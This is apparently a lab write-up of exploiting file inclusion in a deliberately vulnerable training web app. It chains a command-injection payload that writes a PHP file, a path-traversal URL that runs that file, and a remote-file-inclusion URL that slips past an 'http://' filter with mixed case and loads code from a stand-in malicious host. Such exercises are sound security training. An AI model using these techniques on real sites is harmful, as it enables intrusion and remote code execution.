File Inclusion:
This vulnerability allows us to, through rewriting the url, modify the webpage
behavior. A way to exploit this is checked by analyzing the url:

http://10.0.23.21/vulnerabilities/fi/?page=include.php

If we change "include.php" to "../sqli_blind/index.php". The page will be a buggy copy of
http://10.0.23.21/vulnerabilities/sqli_blind/. 
We know that file location because of the first vulnerability (Command
execution) which allowed us to study the directory tree of the application.

But now, if we use the first vulnerability again to create a file like this...

$ a || echo "<?php  echo \"H3ll0 W0rld!1! G3t h4x33d! \"; ?>" > ../../hackable/uploads/test.php

And then we modify the url to...

http://10.0.23.21/vulnerabilities/fi/?page=../../hackable/uploads/test.php

We can see a even buggier page that executed our script :)

We can also include external php code hosted in another http server, as there
is a minimal defense system replacing "http://" to "", we just have to write it
uppercase as in:

http://10.0.23.21/vulnerabilities/fi/?page=HtTp://maliciouswebpage.com/maliciouscode.php
